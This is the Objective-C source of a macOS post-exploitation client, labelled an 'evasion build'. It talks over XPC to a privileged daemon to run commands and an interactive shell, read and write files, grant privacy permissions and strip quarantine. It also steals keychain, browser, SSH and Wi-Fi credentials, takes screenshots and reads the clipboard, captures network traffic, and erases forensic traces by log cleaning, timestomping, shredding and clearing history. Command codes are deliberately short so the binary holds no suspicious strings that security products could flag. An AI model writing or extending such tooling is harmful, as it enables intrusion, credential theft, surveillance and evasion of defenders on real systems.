/*
 * helper_client.m
 * XPC Post-Exploitation Framework — Unprivileged Client (Evasion Build)
 *
 * EDR Evasion:
 *   - Auto JSON when no TTY (Metasploit auto-detection)
 *   - Short command codes (no suspicious strings in binary)
 *   - Service name as positional arg (no --flags)
 *
 * Usage:
 *   ./client <service_name> <cmd> [args...]
 *   TTY  → colored output
 *   pipe → JSON output (auto)
 */

#import <Foundation/Foundation.h>
#import "../daemon/helper_protocol.h"
#include <unistd.h>

#pragma mark - Globals

static BOOL g_json = NO;
static NSString *g_service = nil;
NSString *g_serviceName = nil;

#pragma mark - Output

#define C_G "\033[32m"
#define C_R "\033[31m"
#define C_C "\033[36m"
#define C_M "\033[35m"
#define C_N "\033[0m"

static void emit(const char *c, const char *p, const char *f, va_list a) {
    if (g_json) return;
    fprintf(stdout, "%s%s%s ", c, p, C_N);
    vfprintf(stdout, f, a);
    fprintf(stdout, "\n");
}

static void log_ok(const char *f, ...)   __attribute__((format(printf,1,2)));
static void log_fail(const char *f, ...) __attribute__((format(printf,1,2)));
static void log_info(const char *f, ...) __attribute__((format(printf,1,2)));
static void log_mod(const char *f, ...)  __attribute__((format(printf,1,2)));

static void log_ok(const char *f, ...)   { va_list a; va_start(a,f); emit(C_G,"[+]",f,a); va_end(a); }
static void log_fail(const char *f, ...) { va_list a; va_start(a,f); emit(C_R,"[-]",f,a); va_end(a); }
static void log_info(const char *f, ...) { va_list a; va_start(a,f); emit(C_C,"[*]",f,a); va_end(a); }
static void log_mod(const char *f, ...)  { va_list a; va_start(a,f); emit(C_M,"[>]",f,a); va_end(a); }

static void json_out(NSString *c, BOOL ok, id d) {
    if (!g_json) return;
    NSMutableDictionary *o = [NSMutableDictionary new];
    o[@"s"] = ok ? @"1" : @"0";
    o[@"c"] = c;
    if ([d isKindOfClass:[NSDictionary class]] || [d isKindOfClass:[NSArray class]])
        o[@"d"] = d;
    else if ([d isKindOfClass:[NSData class]])
        o[@"d"] = [d base64EncodedStringWithOptions:0];
    else if (d)
        o[@"d"] = [d description];
    NSData *jd = [NSJSONSerialization dataWithJSONObject:o options:0 error:nil];
    fprintf(stdout, "%s\n", [[NSString alloc] initWithData:jd encoding:NSUTF8StringEncoding].UTF8String);
}

static void print_dict(NSDictionary *d) {
    if (g_json) return;
    for (NSString *k in [d.allKeys sortedArrayUsingSelector:@selector(compare:)]) {
        NSString *v = [d[k] description];
        if ([v containsString:@"\n"])
            fprintf(stdout, "\n  " C_C "-- %s --" C_N "\n%s", k.UTF8String, v.UTF8String);
        else
            fprintf(stdout, "  %-30s = %s\n", k.UTF8String, v.UTF8String);
    }
}

static void print_str(NSString *s) {
    if (g_json) return;
    if (s.length > 0) {
        fprintf(stdout, "%s", s.UTF8String);
        if (![s hasSuffix:@"\n"]) fprintf(stdout, "\n");
    }
}

#pragma mark - Connection

static id<QP> connect_daemon(void) {
    NSXPCConnection *c = [[NSXPCConnection alloc]
        initWithMachServiceName:g_service options:0];
    NSXPCInterface *iface = [NSXPCInterface
        interfaceWithProtocol:@protocol(QP)];
    NSSet *cls = [NSSet setWithObjects:
        [NSString class],[NSArray class],[NSDictionary class],
        [NSNumber class],[NSData class], nil];
    [iface setClasses:cls forSelector:@selector(q10:a:b:z:)
        argumentIndex:1 ofReply:NO];
    [iface setClasses:cls forSelector:@selector(q10:a:b:z:)
        argumentIndex:2 ofReply:NO];
    c.remoteObjectInterface = iface;
    c.interruptionHandler = ^{ if (!g_json) log_fail("interrupted"); };
    c.invalidationHandler = ^{ if (!g_json) log_fail("invalidated"); };
    [c resume];
    return [c remoteObjectProxyWithErrorHandler:^(NSError *e) {
        if (g_json) json_out(@"0", NO, e.localizedDescription);
        else log_fail("%s", e.localizedDescription.UTF8String);
    }];
}

#pragma mark - Semaphore

#define XPC_CALL(TIMEOUT, ...) do { \
    dispatch_semaphore_t _s = dispatch_semaphore_create(0); \
    __VA_ARGS__; \
    dispatch_semaphore_wait(_s, dispatch_time(DISPATCH_TIME_NOW, (TIMEOUT)*NSEC_PER_SEC)); \
} while(0)

#pragma mark - Module 1: Core

static void cmd_info(id<QP> p) {
    XPC_CALL(5, {
        [p q0:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { log_ok("info:"); print_dict(d); json_out(@"i", YES, d); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_exec(id<QP> p, NSString *cmd) {
    XPC_CALL(30, {
        [p q1:cmd z:^(NSString *out, int ec, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { if (ec==0) log_ok("ok(%d):",ec); else log_fail("err(%d):",ec); print_str(out); json_out(@"e", ec==0, out); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_read(id<QP> p, NSString *path) {
    XPC_CALL(10, {
        [p q2:path z:^(NSData *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else if (!d) log_fail("not found");
            else {
                log_ok("%lu bytes:", (unsigned long)d.length);
                NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
                if (s) print_str(s);
                json_out(@"r", YES, s ?: [d base64EncodedStringWithOptions:0]);
            }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_write(id<QP> p, NSString *path, NSString *content) {
    NSData *data = [content dataUsingEncoding:NSUTF8StringEncoding];
    XPC_CALL(10, {
        [p q3:data a:path z:^(BOOL ok, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else if (ok) log_ok("wrote %lu bytes", (unsigned long)data.length);
            json_out(@"w", ok, path);
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_shell(id<QP> p) {
    log_info("shell (exit to quit)");
    char line[4096];
    while (1) {
        fprintf(stdout, C_R "# " C_N); fflush(stdout);
        if (!fgets(line, sizeof(line), stdin)) break;
        size_t len = strlen(line);
        if (len > 0 && line[len-1] == '\n') line[len-1] = '\0';
        if (strlen(line) == 0) continue;
        if (strcmp(line, "exit") == 0 || strcmp(line, "q") == 0) break;
        cmd_exec(p, [NSString stringWithUTF8String:line]);
    }
}

#pragma mark - Module 2: Broker

static void cmd_broker(id<QP> p, NSString *svc) {
    log_mod("broker: %s", svc.UTF8String);
    XPC_CALL(15, {
        [p q4:svc z:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { log_ok("result:"); print_dict(d); json_out(@"b1", YES, d); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_broker_all(id<QP> p) {
    log_mod("broker-all");
    XPC_CALL(15, {
        [p q5:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else {
                int found = 0, miss = 0;
                for (NSString *k in [d.allKeys sortedArrayUsingSelector:@selector(compare:)]) {
                    if ([k hasPrefix:@"_"]) continue;
                    if ([d[k] isEqualToString:@"PORT_FOUND"]) {
                        if (!g_json) fprintf(stdout, "  " C_G "[+]" C_N " %s\n", k.UTF8String);
                        found++;
                    } else { miss++; }
                }
                log_ok("%d found, %d miss", found, miss);
                json_out(@"b2", YES, d);
            }
            dispatch_semaphore_signal(_s);
        }];
    });
}

#pragma mark - Module 3: TCC

static void cmd_tcc_probe(id<QP> p) {
    XPC_CALL(15, {
        [p q6:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { log_ok("tcc:"); print_dict(d); json_out(@"t1", YES, d); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_tcc_dump(id<QP> p) {
    XPC_CALL(15, {
        [p q7:^(NSString *s, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_str(s); json_out(@"t2", YES, s); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_tcc_grant(id<QP> p, NSString *b, NSString *s) {
    XPC_CALL(10, {
        [p q8:b a:s z:^(BOOL ok, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else if (ok) log_ok("granted");
            json_out(@"t3", ok, b);
            dispatch_semaphore_signal(_s);
        }];
    });
}

#pragma mark - Module 4: Identity

static void cmd_identity(id<QP> p) {
    XPC_CALL(15, {
        [p q9:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { log_ok("identity:"); print_dict(d); json_out(@"id", YES, d); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

#pragma mark - Module 5: Spawn

static void cmd_spawn(id<QP> p, NSString *path,
                      NSArray *args, NSDictionary *env) {
    XPC_CALL(30, {
        [p q10:path a:args b:env
            z:^(NSString *out, int ec, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { if (ec==0) log_ok("ok(%d):",ec); else log_fail("err(%d):",ec); print_str(out); }
            json_out(env ? @"s2" : @"s1", ec == 0, out);
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_dequarantine(id<QP> p, NSString *path, BOOL exec) {
    XPC_CALL(15, {
        [p q11:path a:exec
            z:^(BOOL ok, NSString *out, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { if (ok) log_ok("done:"); print_str(out); }
            json_out(@"dq", ok, out);
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_inject(id<QP> p, NSString *interp, NSString *script) {
    XPC_CALL(30, {
        [p q12:script a:interp
            z:^(NSString *out, int ec, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { if (ec==0) log_ok("ok(%d):",ec); else log_fail("err(%d):",ec); print_str(out); }
            json_out(@"inj", ec == 0, out);
            dispatch_semaphore_signal(_s);
        }];
    });
}

#pragma mark - Module 6: Credentials

static void cmd_keychain(id<QP> p) {
    XPC_CALL(15, {
        [p q13:^(NSString *s, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_str(s); json_out(@"k1", YES, s); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_browser(id<QP> p) {
    XPC_CALL(15, {
        [p q14:^(NSString *s, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_str(s); json_out(@"k2", YES, s); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_ssh_keys(id<QP> p) {
    XPC_CALL(10, {
        [p q15:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_dict(d); json_out(@"k3", YES, d); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_wifi(id<QP> p) {
    XPC_CALL(15, {
        [p q16:^(NSString *s, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_str(s); json_out(@"k4", YES, s); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

#pragma mark - Module 7: Surveillance

static void cmd_screenshot(id<QP> p) {
    XPC_CALL(10, {
        [p q17:^(NSData *d, NSError *e) {
            if (e) { log_fail("%s", e.localizedDescription.UTF8String); json_out(@"ss", NO, @"err"); }
            else if (!d) { log_fail("no data"); json_out(@"ss", NO, @"nil"); }
            else {
                log_ok("captured %lu bytes", (unsigned long)d.length);
                json_out(@"ss", YES, d);
            }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_clipboard(id<QP> p) {
    XPC_CALL(5, {
        [p q18:^(NSString *s, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_str(s); json_out(@"cb", YES, s); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_ps(id<QP> p) {
    XPC_CALL(15, {
        [p q19:^(NSString *s, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_str(s); json_out(@"ps", YES, s); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_sessions(id<QP> p) {
    XPC_CALL(5, {
        [p q20:^(NSString *s, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_str(s); json_out(@"se", YES, s); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

#pragma mark - Module 8: Network

static void cmd_net_enum(id<QP> p) {
    XPC_CALL(15, {
        [p q21:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_dict(d); json_out(@"n1", YES, d); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_net_capture(id<QP> p, int secs, NSString *iface) {
    XPC_CALL(secs + 10, {
        [p q22:secs a:iface z:^(NSData *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else if (!d || d.length == 0) log_fail("no packets");
            else { log_ok("%lu bytes", (unsigned long)d.length); json_out(@"n2", YES, d); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

#pragma mark - Module 9: Anti-Forensics

static void cmd_log_clean(id<QP> p, NSString *target) {
    XPC_CALL(15, {
        [p q23:target z:^(BOOL ok, NSString *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { if (ok) log_ok("done"); print_str(d); }
            json_out(@"lc", ok, d);
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_timestomp(id<QP> p, NSString *path, NSString *ts) {
    XPC_CALL(5, {
        [p q24:path a:ts z:^(BOOL ok, NSError *e) {
            if (ok) log_ok("done"); else log_fail("failed");
            json_out(@"ts", ok, path);
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_shred(id<QP> p, NSString *path) {
    XPC_CALL(10, {
        [p q25:path z:^(BOOL ok, NSError *e) {
            if (ok) log_ok("done"); else log_fail("failed");
            json_out(@"sr", ok, path);
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_clear_history(id<QP> p) {
    XPC_CALL(10, {
        [p q26:^(BOOL ok, NSString *d, NSError *e) {
            if (ok) { log_ok("done"); print_str(d); } else log_fail("failed");
            json_out(@"ch", ok, d);
            dispatch_semaphore_signal(_s);
        }];
    });
}

#pragma mark - Module 10: Recon

static void cmd_enum_system(id<QP> p) {
    XPC_CALL(30, {
        [p q27:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_dict(d); json_out(@"e1", YES, d); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_security_tools(id<QP> p) {
    XPC_CALL(15, {
        [p q28:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else {
                for (NSString *k in [d.allKeys sortedArrayUsingSelector:@selector(compare:)]) {
                    if (g_json) break;
                    if ([d[k] isEqualToString:@"DETECTED"])
                        fprintf(stdout, "  " C_R "%-20s !" C_N "\n", k.UTF8String);
                    else
                        fprintf(stdout, "  " C_G "%-20s ok" C_N "\n", k.UTF8String);
                }
                json_out(@"e2", YES, d);
            }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_enum_persist(id<QP> p) {
    XPC_CALL(15, {
        [p q29:^(NSString *s, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_str(s); json_out(@"e3", YES, s); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

static void cmd_security_posture(id<QP> p) {
    XPC_CALL(15, {
        [p q30:^(NSDictionary *d, NSError *e) {
            if (e) log_fail("%s", e.localizedDescription.UTF8String);
            else { print_dict(d); json_out(@"e4", YES, d); }
            dispatch_semaphore_signal(_s);
        }];
    });
}

#pragma mark - Usage (only shown on TTY)

static void usage(const char *prog) {
    fprintf(stderr, "%s <svc> <op> [args]\n", prog);
}

#pragma mark - Main

int main(int argc, char *argv[]) {
    @autoreleasepool {
        /* Auto-detect: no TTY = JSON mode (Metasploit) */
        g_json = !isatty(STDOUT_FILENO);

        /* argv[1] = service name, argv[2] = command */
        if (argc < 3) { usage(argv[0]); return 1; }

        g_service = [NSString stringWithUTF8String:argv[1]];
        g_serviceName = g_service;
        const char *cmd = argv[2];
        int ao = 2; /* arg offset: command is at argv[2] */

        if (!g_json)
            log_info("pid=%d uid=%d", getpid(), getuid());

        id<QP> p = connect_daemon();

        /* Core */
        if      (strcmp(cmd,"i")==0) cmd_info(p);
        else if (strcmp(cmd,"e")==0) {
            if (argc < 4) { log_fail("e <cmd>"); return 1; }
            NSMutableArray *a = [NSMutableArray new];
            for (int i = ao+1; i < argc; i++)
                [a addObject:[NSString stringWithUTF8String:argv[i]]];
            cmd_exec(p, [a componentsJoinedByString:@" "]);
        }
        else if (strcmp(cmd,"r")==0) {
            if (argc < 4) return 1;
            cmd_read(p, [NSString stringWithUTF8String:argv[ao+1]]);
        }
        else if (strcmp(cmd,"w")==0) {
            if (argc < 5) return 1;
            cmd_write(p, [NSString stringWithUTF8String:argv[ao+1]],
                         [NSString stringWithUTF8String:argv[ao+2]]);
        }
        else if (strcmp(cmd,"sh")==0) cmd_shell(p);

        /* Broker */
        else if (strcmp(cmd,"b1")==0) {
            if (argc < 4) return 1;
            cmd_broker(p, [NSString stringWithUTF8String:argv[ao+1]]);
        }
        else if (strcmp(cmd,"b2")==0) cmd_broker_all(p);

        /* TCC */
        else if (strcmp(cmd,"t1")==0) cmd_tcc_probe(p);
        else if (strcmp(cmd,"t2")==0) cmd_tcc_dump(p);
        else if (strcmp(cmd,"t3")==0) {
            if (argc < 5) return 1;
            cmd_tcc_grant(p, [NSString stringWithUTF8String:argv[ao+1]],
                             [NSString stringWithUTF8String:argv[ao+2]]);
        }

        /* Identity */
        else if (strcmp(cmd,"id")==0) cmd_identity(p);

        /* Spawn */
        else if (strcmp(cmd,"s1")==0) {
            if (argc < 4) return 1;
            NSMutableArray *args = [NSMutableArray new];
            for (int i = ao+2; i < argc; i++)
                [args addObject:[NSString stringWithUTF8String:argv[i]]];
            cmd_spawn(p, [NSString stringWithUTF8String:argv[ao+1]],
                      args.count ? args : nil, nil);
        }
        else if (strcmp(cmd,"s2")==0) {
            if (argc < 5) return 1;
            NSMutableDictionary *env = [NSMutableDictionary new];
            for (int i = ao+2; i < argc; i++) {
                NSString *a = [NSString stringWithUTF8String:argv[i]];
                NSRange eq = [a rangeOfString:@"="];
                if (eq.location != NSNotFound)
                    env[[a substringToIndex:eq.location]] = [a substringFromIndex:eq.location+1];
            }
            cmd_spawn(p, [NSString stringWithUTF8String:argv[ao+1]], nil, env);
        }
        else if (strcmp(cmd,"dq")==0) {
            if (argc < 4) return 1;
            BOOL x = (argc >= 5 && strcmp(argv[ao+2], "x") == 0);
            cmd_dequarantine(p, [NSString stringWithUTF8String:argv[ao+1]], x);
        }
        else if (strcmp(cmd,"inj")==0) {
            if (argc < 5) return 1;
            NSMutableArray *parts = [NSMutableArray new];
            for (int i = ao+2; i < argc; i++)
                [parts addObject:[NSString stringWithUTF8String:argv[i]]];
            cmd_inject(p, [NSString stringWithUTF8String:argv[ao+1]],
                       [parts componentsJoinedByString:@" "]);
        }

        /* Credentials */
        else if (strcmp(cmd,"k1")==0)  cmd_keychain(p);
        else if (strcmp(cmd,"k2")==0)  cmd_browser(p);
        else if (strcmp(cmd,"k3")==0)  cmd_ssh_keys(p);
        else if (strcmp(cmd,"k4")==0)  cmd_wifi(p);

        /* Surveillance */
        else if (strcmp(cmd,"ss")==0)  cmd_screenshot(p);
        else if (strcmp(cmd,"cb")==0)  cmd_clipboard(p);
        else if (strcmp(cmd,"ps")==0)  cmd_ps(p);
        else if (strcmp(cmd,"se")==0)  cmd_sessions(p);

        /* Network */
        else if (strcmp(cmd,"n1")==0) cmd_net_enum(p);
        else if (strcmp(cmd,"n2")==0) {
            if (argc < 5) return 1;
            cmd_net_capture(p, atoi(argv[ao+1]), [NSString stringWithUTF8String:argv[ao+2]]);
        }

        /* Anti-Forensics */
        else if (strcmp(cmd,"lc")==0) {
            if (argc < 4) return 1;
            cmd_log_clean(p, [NSString stringWithUTF8String:argv[ao+1]]);
        }
        else if (strcmp(cmd,"ts")==0) {
            if (argc < 5) return 1;
            cmd_timestomp(p, [NSString stringWithUTF8String:argv[ao+1]],
                             [NSString stringWithUTF8String:argv[ao+2]]);
        }
        else if (strcmp(cmd,"sr")==0) {
            if (argc < 4) return 1;
            cmd_shred(p, [NSString stringWithUTF8String:argv[ao+1]]);
        }
        else if (strcmp(cmd,"ch")==0) cmd_clear_history(p);

        /* Recon */
        else if (strcmp(cmd,"e1")==0) cmd_enum_system(p);
        else if (strcmp(cmd,"e2")==0) cmd_security_tools(p);
        else if (strcmp(cmd,"e3")==0) cmd_enum_persist(p);
        else if (strcmp(cmd,"e4")==0) cmd_security_posture(p);

        else { if (!g_json) usage(argv[0]); return 1; }

        usleep(500000);
        return 0;
    }
}
